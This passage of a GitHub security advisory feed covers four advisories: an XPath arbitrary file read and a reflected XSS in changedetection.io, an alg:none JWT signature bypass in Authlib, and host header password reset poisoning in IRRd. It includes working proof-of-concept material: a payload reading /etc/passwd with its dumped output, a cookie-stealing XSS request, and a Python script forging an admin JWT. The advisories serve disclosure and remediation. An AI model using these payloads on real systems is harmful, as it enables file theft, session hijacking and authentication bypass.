<li><p>The changedetection.io application allows users to specify XPath expressions as content filters via the include_filters field. These XPath expressions are processed using the elementpath library which implements XPath 3.0/3.1 specification.</p>
</li>
<li><p>XPath 3.0 includes the unparsed-text() function which can read arbitrary files from the filesystem. The application does not validate or sanitize XPath expressions to block dangerous functions, allowing an attacker to read any file accessible to the application process.</p>
</li>
</ul>
<h3 id="data-flow">Data Flow</h3>
<pre><code>User Input (include_filters field)
    ↓
forms.py:ValidateCSSJSONXPATHInput() - Only validates syntax, NOT function safety
    ↓
Watch configuration stored in datastore
    ↓
Scheduled fetch triggers html_tools.py processing
    ↓
html_tools.py:xpath_filter() at line 213
    ↓
elementpath.select(root, xpath_expression, parser=XPath3Parser)
    ↓
XPath 3.0 unparsed-text('file:///etc/passwd') executed
    ↓
File contents returned as "filtered content"
    ↓
Stored as snapshot, viewable in UI
</code></pre>
<p><strong>Affected Code</strong>
<strong>File:</strong> changedetectionio/html_tools.py
<strong>Function:</strong> xpath_filter()
<strong>Lines:</strong> 187-220</p>
<pre><code>def xpath_filter(xpath_filter, html_content, append_pretty_line_formatting=False, is_rss=False):
    # ...
    from elementpath import XPath3Parser  # XPath 3.0 with dangerous functions
    # ...
    r = elementpath.select(root, xpath_filter.strip(), parser=XPath3Parser)  # Line 213
</code></pre>
<p>Validation (forms.py):</p>
<pre><code>class ValidateCSSJSONXPATHInput:
    def __call__(self, form, field):
        # Only checks if XPath is syntactically valid
        # Does NOT check for dangerous functions like unparsed-text()
</code></pre>
<h3 id="details">Details</h3>
<ul>
<li>Navigate to the <a href="http://ewn9c0k01ghh7f588a7mij4y1w6iz8gb.tryneoai.com:5000/">http://ewn9c0k01ghh7f588a7mij4y1w6iz8gb.tryneoai.com:5000/</a> instance</li>
<li>Create a new watch with any valid URL (e.g., <a href="https://example.com">https://example.com</a>)</li>
<li>Edit the watch and set the "CSS/JSONPath/JQ/XPath Filters" field to:</li>
</ul>
<pre><code>xpath:unparsed-text('file:///etc/passwd')
</code></pre>
<ul>
<li>Save and trigger a recheck</li>
<li>View the preview/snapshot - the file contents will be displayed</li>
</ul>
<img src="https://github.com/user-attachments/assets/f39df9c3-52c9-4fa8-ab57-75c7d4955017" alt="image" height="1108" width="2800">

<h3 id="poc">PoC</h3>
<p>python script for easy reproduction: <a href="https://gist.githubusercontent.com/DhiyaneshGeek/27a6239f34023d43a0b89afb05edc5d2/raw/76d2b1f035164298d57699741eb79a8376f4ed47/poc_xpath_file_read.py">https://gist.githubusercontent.com/DhiyaneshGeek/27a6239f34023d43a0b89afb05edc5d2/raw/76d2b1f035164298d57699741eb79a8376f4ed47/poc_xpath_file_read.py</a></p>
<pre><code>python3 poc_xpath_file_read.py http://ewn9c0k01ghh7f588a7mij4y1w6iz8gb.tryneoai.com:5000 /etc/passwd

╔═══════════════════════════════════════════════════════════════╗
║  XPath 3.0 Arbitrary File Read Exploit                        ║
║  Target: changedetection.io                                   ║
║  Vulnerability: unparsed-text() in XPath filters              ║
╚═══════════════════════════════════════════════════════════════╝
    
[*] Creating new watch for https://example.com...
[+] Watch created with UUID: 5215b704-809c-4218-952b-aad9b6ee41e1
[*] Setting XPath filter to read: /etc/passwd
[+] XPath filter set successfully
[*] Triggering recheck...
[*] Waiting for check to complete...
[*] Retrieving file contents...

[+] SUCCESS! File contents retrieved:
============================================================
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin _apt:x:42:65534::/nonexistent:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin

============================================================
[*] Cleaning up (deleting watch)...
</code></pre>
<h3 id="impact">Impact</h3>
<ul>
<li>Read any file accessible to the application process</li>
<li>Exfiltrate sensitive configuration files, credentials, API keys</li>
<li>Read application source code</li>
<li>Access database files if file-based (SQLite)</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/dgtlmoon/changedetection.io/security/advisories/GHSA-6fmw-82m7-jq6p">https://github.com/dgtlmoon/changedetection.io/security/advisories/GHSA-6fmw-82m7-jq6p</a></li>
<li><a href="https://github.com/dgtlmoon/changedetection.io/commit/417d57e5749441e4be9acc4010369bded805d66f">https://github.com/dgtlmoon/changedetection.io/commit/417d57e5749441e4be9acc4010369bded805d66f</a></li>
<li><a href="https://github.com/dgtlmoon/changedetection.io/releases/tag/0.54.4">https://github.com/dgtlmoon/changedetection.io/releases/tag/0.54.4</a></li>
<li><a href="https://github.com/advisories/GHSA-6fmw-82m7-jq6p">https://github.com/advisories/GHSA-6fmw-82m7-jq6p</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6fmw-82m7-jq6p</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-04T20:59:35.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[changedetection.io] changedetection.io has Reflected XSS in its RSS Tag Error Response]]></title>
        <id>https://github.com/advisories/GHSA-8whx-v8qq-pq64</id>
        <link href="https://github.com/advisories/GHSA-8whx-v8qq-pq64"/>
        <updated>2026-03-04T20:58:17.000Z</updated>
        <content type="html"><![CDATA[<p>A reflected cross-site scripting (XSS) vulnerability was identified in the <code>/rss/tag/</code> endpoint of changedetection.io. The <code>tag_uuid</code> path parameter is reflected directly in the HTTP response body without HTML escaping. Since Flask returns <code>text/html</code> by default for plain string responses, the browser parses and executes injected JavaScript.</p>
<p>This vulnerability persists in version <strong>0.54.1</strong>, which patched the related XSS in <code>/rss/watch/</code> (CVE-2026-27645 / GHSA-mw8m-398g-h89w) but did not address the identical pattern in the tag RSS endpoint.</p>
<h2 id="package">Package</h2>
<ul>
<li><strong>Ecosystem:</strong> pip</li>
<li><strong>Package:</strong> changedetection.io</li>
<li><strong>Affected versions:</strong> &lt;= 0.54.1</li>
<li><strong>Patched versions:</strong> <em>(none yet)</em></li>
</ul>
<h2 id="severity">Severity</h2>
<p><strong>Moderate - CVSS 6.1</strong>
<code>CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N</code></p>
<h2 id="details">Details</h2>
<p><strong>File:</strong> <code>changedetectionio/blueprint/rss/tag.py</code> <strong>Line:</strong> 36 <strong>Source:</strong> <a href="https://raw.githubusercontent.com/dgtlmoon/changedetection.io/1d72716c6988a4f6796bb85a5d42872800cd7a70/changedetectionio/blueprint/rss/tag.py">tag.py @ 1d72716</a></p>
<p>The <code>tag_uuid</code> parameter from the URL path is interpolated into the response body using an f-string with no escaping:</p>
<pre><code class="language-python">tag = datastore.data['settings']['application'].get('tags', {}).get(tag_uuid)
if not tag:
    return f"Tag with UUID {tag_uuid} not found", 404  # ← No escaping, Content-Type: text/html
</code></pre>
<p>Flask's default <code>Content-Type</code> for plain string responses is <code>text/html; charset=utf-8</code>, so any HTML/JavaScript injected via <code>{tag_uuid}</code> is rendered and executed by the browser.</p>
<h3 id="relationship-to-cve-2026-27645">Relationship to CVE-2026-27645</h3>
<p>CVE-2026-27645 (GHSA-mw8m-398g-h89w) addressed the identical vulnerability pattern in <code>/rss/watch/</code> (<code>single_watch.py</code>). The fix applied in v0.54.1 patched that endpoint but <strong>did not</strong> fix the same pattern in <code>/rss/tag/</code> (<code>tag.py</code>). Testing confirms:</p>
<ul>
<li><strong><code>/rss/watch/</code> on v0.54.1</strong> — Returns generic 404 page, XSS no longer triggers ✅</li>
<li><strong><code>/rss/tag/</code> on v0.54.1</strong> — XSS payload still fires, vulnerability confirmed ❌</li>
</ul>
<h2 id="attack-vector">Attack Vector</h2>
<p>The attack requires a valid RSS access token, which is a 32-character hex string exposed in the <code>&lt;link&gt;</code> HTML tag on the homepage without authentication:</p>
<ol>
<li><p>Attacker visits the target's homepage (if unauthenticated) and extracts the RSS token from the <code>&lt;link&gt;</code> tag</p>
</li>
<li><p>Crafts a malicious URL:</p>
<pre><code>http://target:5000/rss/tag/&lt;img src=x onerror=alert(document.cookie)&gt;?token=EXTRACTED_TOKEN
</code></pre>
</li>
<li><p>Sends the link to a victim who has an active session on the changedetection.io instance</p>
</li>
<li><p>When the victim clicks the link, the server responds with:</p>
<pre><code>Tag with UUID &lt;img src=x onerror=alert(document.cookie)&gt; not found
</code></pre>
</li>
<li><p>The browser renders the <code>&lt;img&gt;</code> tag, the <code>onerror</code> fires, and JavaScript executes in the victim's session context</p>
</li>
</ol>
<h2 id="proof-of-concept">Proof of Concept</h2>
<h3 id="request">Request</h3>
<pre><code class="language-http">GET /rss/tag/%3Cimg%20src%3Dx%20onerror%3Dalert(document.domain)%3E?token=60b83b06df98b24c66367bc3d233105b HTTP/1.1
Host: localhost:5000
</code></pre>
<h3 id="response">Response</h3>
<pre><code class="language-http">HTTP/1.1 404 NOT FOUND
Content-Type: text/html; charset=utf-8

Tag with UUID &lt;img src=x onerror=alert(document.domain)&gt; not found
</code></pre>
<p>The XSS payload is reflected unescaped in an HTML response. The browser executes <code>alert(document.domain)</code> and displays "localhost", confirming JavaScript execution.</p>
<p><strong>Tested on:</strong> changedetection.io v0.54.1 (Docker, localhost, Feb 25, 2026)</p>
<p><a href="https://github.com/user-attachments/assets/6db07f6a-6df8-48a7-a597-9f39dfa1bb29">https://github.com/user-attachments/assets/6db07f6a-6df8-48a7-a597-9f39dfa1bb29</a></p>
<h2 id="impact">Impact</h2>
<ul>
<li><strong>Session cookie theft</strong> via <code>document.cookie</code> exfiltration</li>
<li><strong>Account takeover</strong> if session cookies lack the <code>HttpOnly</code> flag</li>
<li><strong>Phishing</strong> via crafted links that appear to originate from a trusted changedetection.io instance</li>
<li><strong>Low exploitation barrier</strong> - the RSS token is obtainable without authentication from the homepage <code>&lt;link&gt;</code> tag</li>
<li><strong>Widespread exposure</strong> - prior scanning of internet-facing instances (during CVE-2026-27645 research) identified 500+ publicly accessible deployments</li>
</ul>
<h2 id="suggested-fix">Suggested Fix</h2>
<p>Escape the <code>tag_uuid</code> parameter before reflecting it in the response, or set the <code>Content-Type</code> to <code>text/plain</code>:</p>
<h3 id="option-a-html-escape-recommended">Option A: HTML Escape (Recommended)</h3>
<pre><code class="language-python">from markupsafe import escape

if not tag:
    return f"Tag with UUID {escape(tag_uuid)} not found", 404
</code></pre>
<h3 id="option-b-set-content-type-to-textplain">Option B: Set Content-Type to text/plain</h3>
<pre><code class="language-python">from flask import make_response

if not tag:
    resp = make_response(f"Tag with UUID {tag_uuid} not found", 404)
    resp.headers['Content-Type'] = 'text/plain; charset=utf-8'
    return resp
</code></pre>
<h2 id="credits">Credits</h2>
<ul>
<li><strong>Roberto Nunes</strong> (<a href="https://github.com/Akokonunes">@Akokonunes</a>) - Reporter</li>
<li><strong>neo-ai-engineer</strong> (<a href="https://github.com/neo-ai-engineer">@neo-ai-engineer</a>) - Reporter</li>
</ul>
<h2 id="references">References</h2>
<ul>
<li>Related advisory: <a href="https://github.com/dgtlmoon/changedetection.io/security/advisories/GHSA-mw8m-398g-h89w">GHSA-mw8m-398g-h89w</a> (CVE-2026-27645)</li>
<li>Vulnerable source: <a href="https://raw.githubusercontent.com/dgtlmoon/changedetection.io/1d72716c6988a4f6796bb85a5d42872800cd7a70/changedetectionio/blueprint/rss/tag.py">tag.py @ 1d72716</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/dgtlmoon/changedetection.io/security/advisories/GHSA-8whx-v8qq-pq64">https://github.com/dgtlmoon/changedetection.io/security/advisories/GHSA-8whx-v8qq-pq64</a></li>
<li><a href="https://github.com/dgtlmoon/changedetection.io/security/advisories/GHSA-mw8m-398g-h89w">https://github.com/dgtlmoon/changedetection.io/security/advisories/GHSA-mw8m-398g-h89w</a></li>
<li><a href="https://github.com/dgtlmoon/changedetection.io/commit/ec7d56f85d1e9690fca7cb4711c1fb20dffec780">https://github.com/dgtlmoon/changedetection.io/commit/ec7d56f85d1e9690fca7cb4711c1fb20dffec780</a></li>
<li><a href="https://github.com/dgtlmoon/changedetection.io/releases/tag/0.54.4">https://github.com/dgtlmoon/changedetection.io/releases/tag/0.54.4</a></li>
<li><a href="https://github.com/advisories/GHSA-8whx-v8qq-pq64">https://github.com/advisories/GHSA-8whx-v8qq-pq64</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8whx-v8qq-pq64</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-03-04T20:58:14.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[authlib] Authlib: Setting `alg: none` and a blank signature appears to bypass signature verification]]></title>
        <id>https://github.com/advisories/GHSA-7wc2-qxgw-g8gg</id>
        <link href="https://github.com/advisories/GHSA-7wc2-qxgw-g8gg"/>
        <updated>2026-03-04T20:55:47.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>After upgrading the library from 1.5.2 to 1.6.0 (and the latest 1.6.5) it was noticed that previous tests involving passing a malicious JWT containing alg: none and an empty signature was passing the signature verification step without any changes to the application code when a failure was expected. </p>
<h3 id="details">Details</h3>
<p>It was likely introduced in this commit:
<a href="https://github.com/authlib/authlib/commit/a61c2acb807496e67f32051b5f1b1d5ccf8f0a75">https://github.com/authlib/authlib/commit/a61c2acb807496e67f32051b5f1b1d5ccf8f0a75</a></p>
<h3 id="poc">PoC</h3>
<pre><code>from authlib.jose import jwt, JsonWebKey
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend
import json
import base64


def create_jwks():
    private_key = rsa.generate_private_key(
        public_exponent=65537, key_size=2048, backend=default_backend()
    )
    public_pem = private_key.public_key().public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo,
    )
    jwk = JsonWebKey.import_key(public_pem).as_dict()
    jwk["kid"] = "test-key-001"
    jwk["use"] = "sig"
    jwk["alg"] = "RS256"
    jwks = {"keys": [jwk]}
    return jwks


def create_forged_token_with_alg_none():
    forged_header = {"alg": "none"}
    forged_payload = {
        "sub": "user123",
        "role": "admin",
        "iat": 1735603200,
    }

    header_b64 = base64.urlsafe_b64encode(
        json.dumps(forged_header).encode("utf-8")
    ).rstrip(b"=")

    payload_b64 = base64.urlsafe_b64encode(
        json.dumps(forged_payload).encode("utf-8")
    ).rstrip(b"=")

    forged_token = header_b64 + b"." + payload_b64 + b"."
    return forged_token


jwks = create_jwks()
forged_token = create_forged_token_with_alg_none()
try:
    claims = jwt.decode(forged_token, jwks)
    print(f"VULNERABLE: Forged token (alg:none) accepted: role={claims['role']}")
except Exception as e:
    print(f"SECURE: Token rejected - {type(e).__name__}")
</code></pre>
<p>Output:</p>
<pre><code>pip install -q authlib==1.5.2
python3 authlib_alg_none_vulnerability.py 
SECURE: Token rejected - BadSignatureError
pip install -q authlib==1.6.5
python3 authlib_alg_none_vulnerability.py 
VULNERABLE: Forged token (alg:none) accepted: role=admin
</code></pre>
<h3 id="impact">Impact</h3>
<p>Users of the library are likely not aware that they now need to check the provided headers and disallow <code>alg: none</code> usage, it is not obvious from the release notes that any action needs to be taken. As a best-practice, the library should adopt a 'secure by default' stance and default to rejecting it and allow the application to provide an algorithm whitelist.</p>
<p>Applications using this library for authentication or authorization may accept malicious, forged JWTs, leading to:</p>
<ul>
<li>Authentication bypass</li>
<li>Privilege escalation</li>
<li>Unauthorized access</li>
<li>Modification of application data</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/authlib/authlib/security/advisories/GHSA-7wc2-qxgw-g8gg">https://github.com/authlib/authlib/security/advisories/GHSA-7wc2-qxgw-g8gg</a></li>
<li><a href="https://github.com/authlib/authlib/commit/a61c2acb807496e67f32051b5f1b1d5ccf8f0a75">https://github.com/authlib/authlib/commit/a61c2acb807496e67f32051b5f1b1d5ccf8f0a75</a></li>
<li><a href="https://github.com/authlib/authlib/commit/b87c32ed07b8ae7f805873e1c9cafd1016761df7">https://github.com/authlib/authlib/commit/b87c32ed07b8ae7f805873e1c9cafd1016761df7</a></li>
<li><a href="https://github.com/advisories/GHSA-7wc2-qxgw-g8gg">https://github.com/advisories/GHSA-7wc2-qxgw-g8gg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7wc2-qxgw-g8gg</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-04T20:55:47.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[irrd] IRRd: web UI host header injection allows password reset poisoning via attacker-controlled email links]]></title>
        <id>https://github.com/advisories/GHSA-22m3-c7vp-49fj</id>
        <link href="https://github.com/advisories/GHSA-22m3-c7vp-49fj"/>
        <updated>2026-03-04T20:33:23.000Z</updated>
        <content type="html"><![CDATA[<h2 id="impact">Impact</h2>
<p>An attacker can manipulate the HTTP <code>Host</code> header on a password reset or account creation request. The confirmation link in the resulting email can then point to an attacker-controlled domain. Opening the link in the email is sufficient to pass the token to the attacker, who can then use it on the real IRRD instance to take over the account. A compromised account can then be used to modify RPSL objects maintained by the account's mntners and perform other account actions.</p>
<p>If the user had two-factor authentication configured, which is required for users with override access, an attacker is not able to log in, even after successfully resetting the password.</p>
<p>This issue affects IRRD 4.5.0 and all 4.4.x versions prior to 4.4.5. IRRD 4.3 and earlier are not affected, as they did not include the web UI.</p>
<h2 id="cause">Cause</h2>
<p>Email links in account creation, password reset, and mntner migration emails were generated from the HTTP request context, allowing an attacker to manipulate the HTTP <code>Host</code> header to redirect these links to an attacker-controlled domain (password reset poisoning).</p>
<h2 id="resolution">Resolution</h2>
<p>Requests with a <code>Host</code> header that does not match <code>server.http.url</code> are now rejected, preventing Host header injection attacks against the web UI.</p>
<p>All existing password reset tokens are invalidated by this upgrade, rendering any tokens that may have been captured by an attacker unusable.</p>
<p>Patched versions: 4.4.5 and 4.5.1.</p>
<h2 id="workarounds">Workarounds</h2>
<p>Configuring a reverse proxy (such as nginx) to reject requests where the <code>Host</code> header does not match the expected hostname is an effective workaround. Enabling two-factor authentication is strongly recommended for all users, as it prevents account takeover even if a password reset token is compromised.</p>
<h2 id="detecting-exploitation">Detecting exploitation</h2>
<p>Because the victim never interacts with the real IRRD instance in this attack, it is difficult to detect exploitation from logs alone.</p>
<p>Indicators that an account was targeted or compromised:</p>
<ul>
<li>A <code>password reset email requested</code> followed by <code>password (re)set successfully</code> where the delay is longer than expected. Legitimate users actively waiting for a reset email tend to complete it quickly; victims who receive an unexpected email are less likely to click it immediately, resulting in a longer delay.</li>
<li>Users receiving a password reset mail without requesting one.</li>
<li>If a successfully attacked user later attempts to log in with their original password, this appears in the logs as <code>user failed login due to invalid account or password</code>.</li>
</ul>
<p>After upgrading to a patched release, all existing password reset tokens are invalidated. Users who can still log in with their password after the upgrade can be certain their account has not been taken over.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/irrdnet/irrd/security/advisories/GHSA-22m3-c7vp-49fj">https://github.com/irrdnet/irrd/security/advisories/GHSA-22m3-c7vp-49fj</a></li>
<li><a href="https://github.com/irrdnet/irrd/commit/8408e0f1b9f47eb2f2e712d6153e32194df05fbb">https://github.com/irrdnet/irrd/commit/8408e0f1b9f47eb2f2e712d6153e32194df05fbb</a></li>
<li><a href="https://github.com/irrdnet/irrd/commit/cf62df4a49d3891e80b2879d9b324d1af050000c">https://github.com/irrdnet/irrd/commit/cf62df4a49d3891e80b2879d9b324d1af050000c</a></li>
<li><a href="https://irrd.readthedocs.io/en/stable/releases/4.4.5">https://irrd.readthedocs.io/en/stable/releases/4.4.5</a></li>
<li><a href="https://irrd.readthedocs.io/en/stable/releases/4.5.1">https://irrd.readthedocs.io/en/stable/releases/4.5.1</a></li>
<li><a href="https://github.com/advisories/GHSA-22m3-c7vp-49fj">https://github.com/advisories/GHSA-22m3-c7vp-49fj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-22m3-c7vp-49fj</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-04T20:33:21.000Z</published>
    </entry>
</feed>